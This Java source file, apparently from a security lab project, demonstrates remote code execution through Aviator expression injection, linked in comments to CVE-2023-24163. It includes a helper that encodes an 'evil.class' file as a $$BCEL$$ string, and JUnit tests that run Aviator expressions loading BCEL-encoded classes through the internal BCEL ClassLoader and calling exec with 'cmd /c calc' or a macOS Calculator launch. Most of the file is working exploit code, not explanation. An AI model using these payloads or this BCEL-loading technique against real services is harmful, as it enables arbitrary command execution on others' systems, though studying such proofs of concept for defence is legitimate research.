package com.best.hello.controller.RCE;

import com.googlecode.aviator.AviatorEvaluator;
import com.googlecode.aviator.AviatorEvaluatorInstance;

import com.googlecode.aviator.Options;
import com.googlecode.aviator.runtime.JavaMethodReflectionFunctionMissing;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import org.junit.Test;

import java.io.FileOutputStream;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.HashSet;
import java.util.Set;

public class BCELEncode {
    public static String class2BCEL(String classFile) throws Exception{
        //将classFile转换为Path对象
        Path path = Paths.get(classFile);
        //使用Files.readAllBytes(path)方法读取类文件的内容，并将其存储在字节数组bytes中
        byte[] bytes = Files.readAllBytes(path);
        String result = Utility.encode(bytes,true);
        //返回Base64编码字符串
        return result;
    }


    public static void decode(String str) throws Exception{
        //解码为字节数组
        byte[] s =  Utility.decode(str,true);
        //把字节数组s写入"payload.class"的文件
        FileOutputStream fos = new FileOutputStream("payload.class");
        fos.write(s);
        fos.close();
    }

//    public static void main(String[] args) throws Exception {
//        //System.getProperty("user.dir")获取当前工作目录，并将相对路径与"SpringEcho.class"连接起来，得到Java类文件的完整路径。
//        // 然后，调用BCELEncode.class2BCEL方法，并将Java类文件的完整路径作为参数传递给它。这个方法将Java类文件编码为Base64编码字符串，并通过System.out.println将结果打印到控制台。
//        System.out.println(BCELEncode.class2BCEL(System.getProperty("user.dir")+"\\src\\test\\java\\com\\fastjson\\vul\\" +"SpringEcho.class"));
//    }

    public static void main(String []args) throws Exception{
        Path path = Paths.get("evil.class");
//        Path path = Paths.get("src/main/java/com/best/hello/controller/RCE/evil.class");
//        Path path = Paths.get("target/classes/com/best/hello/controller/RCE/evil.class");
        byte[] data = Files.readAllBytes(path);
        String s =  Utility.encode(data,true);
        System.out.print("$$BCEL$$"+s);
    }

    @Test
    public void aviator() {

        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
//        evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeP$cbN$c2$40$U$3dCK$5bk$95$97$f8$7e$c4$95$c0$c2$s$c6$j$c6$NjbR$c5$88a_$ca$E$86$40k$da$c1$f0Y$baQ$e3$c2$P$f0$a3$8cw$w$B$a2M$e6$de9$e7$9es$e6$a6_$df$l$9f$ANq$60$p$8b$b2$8dul$a8$b2ib$cb$c46$83q$sB$n$cf$Z$b4J$b5$cd$a07$a2$$g$c8y$o$e4$b7$e3Q$87$c7$P$7egHL$d1$8b$C$7f$d8$f6c$a1$f0$94$d4e_$q$MY$afqsQ$t$c8$t$3c$608$aax$D$ff$c9w$87$7e$d8s$5b2$Wa$af$5e$5d$a0$ee$e2$u$e0IB$G$z$YuU$f4$3f9$83$7d9$J$f8$a3$UQ$98$98$d8$n$dc$8a$c6q$c0$af$84z$d7$a2$f7$8e$95$c9$81$B$d3$c4$ae$83$3d$ec$3bX$c1$w$85$d2$90$n$3f$cflv$G$3c$90$M$a5$94$S$91$7b$dd$9c$853$U$e6$c2$fbq$u$c5$88$f2$ed$k$973P$ae$y$$$3f$a5$eb8$84N$7fT$7d$Z0$b5$GU$8b$90K$9dQ$cf$d6$de$c0$5e$d2$f1$SU$p$r5$d8T$9d_$B$96$e9$G$9a$d2$da$a4R$e6$934$M$b0$de$91$a9$bdB$7b$fe$e37$W$fc$Wr$c8S$_$d0$d1$89$v$d2$v$a5$fa$b5$l$d5$l$f2$9c$f6$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"open /System/Applications/Calculator.app\") );");
        evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$85RMO$h1$Q$7dNB6$yi$c3g$81$7e$A$ad$w5p$c0$S$e2$W$c4$F$F$J$v$40$94T$b9o$9cQb$b4$bb$ae$bc$O$e2g$b5$97R$f5$c0$P$e0G$n$c6K$94D$e5PK$9e$f1$bc$997$f3$y$fb$f1$e9$ef$D$80c$ec$85X$c0$bb$Q$9b$d8$f2f$3b$c0$fb$A$l$E$ca$t$3a$d5$eeT$a0X$df$ef$J$94$ce$cc$80$Ej$z$9d$d2$d58$e9$93$fd$k$f5cFV$5bFEq$_$b2$da$c7$T$b0$e4F$3a$T$f8$daR$s$91$7d$ca$9c$iQ$i$h$a9L$ea$ac$89c$b2$b2s$d6$94t$ab$e3$GW$d3$j$v$81o$f5$d6Mt$h$c98J$87$b2$eb$acN$87$8d$fd9$a8m$8d$a2$ycBQ$r$D$3f$f9U$b9$40$d8$bcS$f4$c3i$93f$B$3e$K$y_$92$h$99A$3b$b2QB$8e$y$ab$K$bbfl$V$9dk$aft$d1k8$f4$8d$aa$u$p$I$f0$a9$8a$j$ecV$f1$Go$F$be$fc_$3f$8f$98$c9$b8$ee$df$90r$Ck9$a4$8d$bc$b8$9e$ea$RX$99$Vv$c6$a9$d3$J$cf$P$87$e4$a6$c1F$7d$fe$be$T$b8$81$cf$u$f1$h$f9U$80$f0$w$d9V8$92$ec$F$fb$85$83$7b$88_yz$91m$f9$FD$c8$b6$3a9$_$f1$J$9c$e5$5b$a1$98$93$8f$f2f$40$e5$P$K$H$bfQ$fc$f9$P$3f$98$e3WP$c32$fb$V$de$rFV$b1$e6$bb$f2w$60$t$b0$9eS7$9e$BW$C$b4$5eS$C$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");

    }

    @Test
    public void te(){
        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
        evaluator.setFunctionMissing(JavaMethodReflectionFunctionMissing.getInstance());
//        evaluator.execute("exec(Runtime.getRuntime(), 'cmd /c calc')");
//        evaluator.execute("exec(Runtime.getRuntime(), 'cmd /c calc')");
//        evaluator.execute("'a'+(c=Class.forName(\"\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");



    }
    @Test
    public void tet(){
        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
//        Set<Class<?>> allowedClassSet = new HashSet<>();
//        allowedClassSet.add(java.util.ArrayList.class);
//        allowedClassSet.add(java.lang.Math.class);
//        evaluator.setOption(Options.ALLOWED_CLASS_SET, allowedClassSet);
        evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dP$cbJ$c3P$Q$3d$d3$3c$8d$a9m$ad$f5$F$82$aeL$bb0$hw$R7RA$uVlq$9f$c6K$b9$rM$q$b9$z$fd$y$dd$a8$b8$f0$D$fc$uq$S$b4$z$5e$9833$87sf$86$fb$f5$fd$f1$J$e0$i$87$O$M$d4$j4$b0$5d$40$d3$c2$8e$85$W$c1$bc$90$89T$97$E$cdk$3f$Q$f4$ab$f4Q$Qj$3d$99$88$db$d9t$q$b2a8$8a$99$d1$c5BD$84S$af7$J$e7$a1$l$87$c9$d8$l$a8L$s$e3$a0$bdF$ddei$q$f2$3c$m8$ddE$q$9e$94L$93$dc$c2$$$f7$83t$96E$e2Z$W$d3$aaC$91$ab$ee$5c$c6g$85$d5$85$J$cb$c2$9e$8b$7d$i$b8p$b0I$b0$ff$U$84$faj$7c$7f4$R$91$o4KJ$a6$feM$7f$b9$86$d0X$J$efg$89$92S$de$e4$8c$85Z6$zo$fd$d6_$3a$c0$Jt$fe$9c$e2U$40$c5$z$8c6wG$9c$89$b3$d1y$D$bdpA$d8$604KR$e3$9a$_eK$n$3d$$$ad$80$fd$8eJ$e7$V$da$f3$3f$b5$B$97Q$e7$ba$ca$b1U$ae$aa$fd$A$bd2$a8$80$9d$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");
    }

    @Test
    public void tt(){
        AviatorEvaluatorInstance evaluator = AviatorEvaluator.newInstance();
        evaluator.execute("'a'+(c=Class.forName(\"$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dP$cbJ$c3P$Q$3d$d3$3c$8d$a9m$ad$f5$F$82$aeL$bb0$hw$R7RA$uVlq$9f$c6K$b9$rM$q$b9$z$fd$y$dd$a8$b8$f0$D$fc$uq$S$b4$z$5e$9833$87sf$86$fb$f5$fd$f1$J$e0$i$87$O$M$d4$j4$b0$5d$40$d3$c2$8e$85$W$c1$bc$90$89T$97$E$cdk$3f$Q$f4$ab$f4Q$Qj$3d$99$88$db$d9t$q$b2a8$8a$99$d1$c5BD$84S$af7$J$e7$a1$l$87$c9$d8$l$a8L$s$e3$a0$bdF$ddei$q$f2$3c$m8$ddE$q$9e$94L$93$dc$c2$$$f7$83t$96E$e2Z$W$d3$aaC$91$ab$ee$5c$c6g$85$d5$85$J$cb$c2$9e$8b$7d$i$b8p$b0I$b0$ff$U$84$faj$7c$7f4$R$91$o4KJ$a6$feM$7f$b9$86$d0X$J$efg$89$92S$de$e4$8c$85Z6$zo$fd$d6_$3a$c0$Jt$fe$9c$e2U$40$c5$z$8c6wG$9c$89$b3$d1y$D$bdpA$d8$604KR$e3$9a$_eK$n$3d$$$ad$80$fd$8eJ$e7$V$da$f3$3f$b5$B$97Q$e7$ba$ca$b1U$ae$aa$fd$A$bd2$a8$80$9d$B$A$A\",true,new com.sun.org.apache.bcel.internal.util.ClassLoader()) ) + ( c.exec(\"cmd /c calc\") );");
    }
    // https://www.ctfiot.com/104155.html
    // https://p0lar1ght.github.io/posts/Dromara_hutool_aviator%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2023-24163/

    // https://geekdaxue.co/read/lexiansheng@dix8fs/ll4oyy

    // BCEL
    // https://www.cnblogs.com/CoLo/p/15869871.html

    // https://github.com/killme2008/aviatorscript/issues/421

    // https://tonyharris.io/poc-week/poc-week-20240303/

}

